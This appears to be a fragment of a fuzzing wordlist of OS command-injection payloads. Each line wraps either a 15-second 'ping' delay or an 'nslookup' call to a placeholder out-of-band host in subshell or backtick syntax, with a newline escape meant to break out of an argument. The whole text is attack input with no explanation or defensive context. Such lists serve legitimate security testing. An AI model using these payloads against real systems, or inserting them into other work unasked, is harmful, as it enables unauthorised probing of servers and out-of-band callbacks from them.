+$(0x0a ping -n 15 127.0.0.1)
+$((0x0a ping -n 15 127.0.0.1))
+`0x0a ping -n 15 127.0.0.1`
+0x0a nslookup OOB_URL
+$(0x0a nslookup OOB_URL)
+$((0x0a nslookup OOB_URL))
+`0x0a nslookup OOB_URL`
